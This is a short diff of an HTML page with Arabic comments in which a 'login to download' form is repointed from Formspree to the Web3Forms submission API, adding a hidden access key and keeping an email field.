@@ -70,8 +70,10 @@
     <div class="login-card">
         <h2>تسجيل الدخول للتحميل</h2>
         
-        <!-- النموذج المربوط بـ Formspree -->
-        <form action="https://formspree.io/f/xjyydadr" method="POST">
+        <!-- النموذج المربوط بـ Web3Forms مع مفتاحك الخاص -->
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="26ba1b49-4120-4f22-a120-80a5f0f35316">
+            
             <label>البريد الإلكتروني:</label>
             <input type="email" name="email" placeholder="example@gmail.com" required>
 
